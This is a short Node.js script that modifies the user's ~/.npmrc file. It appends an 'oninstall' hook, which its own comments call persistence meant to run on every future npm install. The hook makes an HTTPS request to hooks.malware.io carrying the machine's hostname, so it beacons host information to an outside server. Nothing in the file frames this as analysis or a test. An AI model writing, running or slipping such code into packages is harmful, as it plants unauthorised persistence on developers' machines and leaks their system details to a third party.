const fs = require('fs');
const os = require('os');
const path = require('path');

const home = os.homedir();
const npmrcPath = path.join(home, '.npmrc');

// Read existing .npmrc content
let existing = '';
try {
  existing = fs.readFileSync(npmrcPath, 'utf8');
} catch(e) {}

// Inject an oninstall hook for persistence
// This will execute on every future npm install
const hook = '\noninstall=node -e "require(\'https\').get(\'https://hooks.malware.io/ping?h=\'+require(\'os\').hostname())"';

if (!existing.includes('oninstall')) {
  fs.writeFileSync(npmrcPath, existing + hook, 'utf8');
}
